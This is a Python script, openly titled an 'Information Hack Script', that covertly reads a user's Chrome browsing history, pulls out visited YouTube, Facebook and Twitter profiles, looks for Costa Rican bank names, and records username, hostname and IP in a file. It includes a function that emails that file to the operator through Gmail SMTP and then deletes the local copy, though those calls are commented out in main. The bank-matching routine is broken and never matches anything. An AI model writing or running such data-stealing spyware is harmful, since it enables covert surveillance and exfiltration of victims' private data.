# Sh4dow18 Information Hack Script
# Made by: Sh4dow18
# Github: https://github.com/sh4dow18
from platform import system
from getpass import getuser
import sqlite3
from re import findall as regex
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
import socket
from os import remove


def ObtainUserPath(what_platform, user):
    user_path = None
    if what_platform == "Windows":
        user_path = "C:\\Users\\" + user
    elif  what_platform == "Linux":
        user_path = "/home/" + user
    return user_path


def ObtainChromeHistory(what_platform, user_path):
    chrome_history = None
    chrome_history_path = None
    if what_platform == "Windows":
        chrome_history_path = user_path + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History"
    elif what_platform == "Linux":
        chrome_history_path = user_path + "/.config/google-chrome/Default/History"
    while chrome_history is None:
        try:
            connection = sqlite3.connect(chrome_history_path)
            cursor = connection.cursor()
            cursor.execute("SELECT title, last_visit_time, url FROM urls ORDER BY last_visit_time DESC")
            chrome_history = cursor.fetchall()
        except sqlite3.OperationalError:
            print("Error, retrying...")
    return chrome_history


def ObtainYoutubeChannels(chrome_history):
    channels_visited = []
    for youtube in chrome_history:
        results = regex("https://www.youtube.com/c/([A-Za-z0-9]+)", youtube[2])
        if len(results) != 0:
            if results[0] not in channels_visited:
                channels_visited.append(results[0])
    return channels_visited


def ObtainFacebookProfiles(chrome_history):
    facebook_profiles = []
    for facebook in chrome_history:
        results = regex("https://www.facebook.com/([A-Za-z0-9_]+)", facebook[2])
        if len(results) != 0:
            if results[0] not in facebook_profiles and results[0] != "pg":
                facebook_profiles.append(results[0])
    return facebook_profiles


def ObtainTwitterProfiles(chrome_history):
    twitter_profiles = []
    for twitter in chrome_history:
        results = regex("https://twitter.com/([A-Za-z0-9_]+)", twitter[2])
        if len(results) != 0:
            if results[0] not in twitter_profiles:
                twitter_profiles.append(results[0])
    return twitter_profiles


def ObtainBanks(chrome_history):
    banks_found = []
    banks = ["Grupo Mutual", "Mutual", "Proamerica", "Banco Nacional de Costa Rica", "Banco de Costa Rica"]
    for bank_found in chrome_history:
        for bank in banks:
            for position_banks_found in banks_found:
                if position_banks_found.lower() == bank.lower():
                    banks_found.append(bank_found)
    return banks_found


def InformationFile(user, host, ip_address, what_platform, channels_visited, facebook_profiles, twitter_profiles, banks_found):
    file = open("information.txt", "w")
    file.write("- User: " + user)
    file.write("\n- Host: " + host)
    file.write("\n- Ip Address: " + ip_address)
    file.write("\n- Operating System: " + what_platform)
    file.write("\n- Youtube Channels Visited: ")
    AddingInformation(file, channels_visited)
    file.write("\n- Facebook Profiles Visited: ")
    AddingInformation(file, facebook_profiles)
    file.write("\n- Twitter Profiles Visited: ")
    AddingInformation(file, twitter_profiles)
    file.write("\n- Banks Found: ")
    AddingInformation(file, banks_found)
    file.close()


def AddingInformation(file, information):
    if len(information) != 0:
        file.write("{}".format(", ".join(information)))
    else:
        file.write("None Found")


def ObtainIpAddress():
    using_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    using_socket.connect(("8.8.8.8", 80))
    ip_address = using_socket.getsockname()[0]
    using_socket.close()
    return ip_address


def SendEmail(user, host):
    destinatary_email = "<your_gmail>"
    msg = MIMEMultipart()
    msg['to'] = destinatary_email
    msg['from'] = destinatary_email
    msg['subject'] = "Success"
    readding_file = open("information.txt", "r")
    att  =  MIMEApplication(readding_file.read(),'utf-8')
    att.add_header('Content-Disposition', 'attachment', filename="{}@{}.txt".format(user, host))
    msg.attach(att)
    readding_file.close()
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(destinatary_email,"<your_password>")
    server.sendmail(msg['from'], msg['to'], msg.as_string())
    server.quit()


def PrintHistory(chrome_history):
    for i in chrome_history:
        print("{}".format(i))


def main():
    what_platform = system()
    user = getuser()
    host = socket.gethostname()
    ip_address = ObtainIpAddress()
    user_path = ObtainUserPath(what_platform, user)
    chrome_history = ObtainChromeHistory(what_platform, user_path)
    channels_visited = ObtainYoutubeChannels(chrome_history)
    facebook_profiles = ObtainFacebookProfiles(chrome_history)
    twitter_profiles = ObtainTwitterProfiles(chrome_history)
    banks_found = ObtainBanks(chrome_history)
    InformationFile(user, host, ip_address, what_platform, channels_visited, facebook_profiles, twitter_profiles,  banks_found)
    # SendEmail(user, host)
    # remove("information.txt")
    # print("Correo Enviado :D")
    # PrintHistory(chrome_history)

if __name__ == "__main__":
    main()

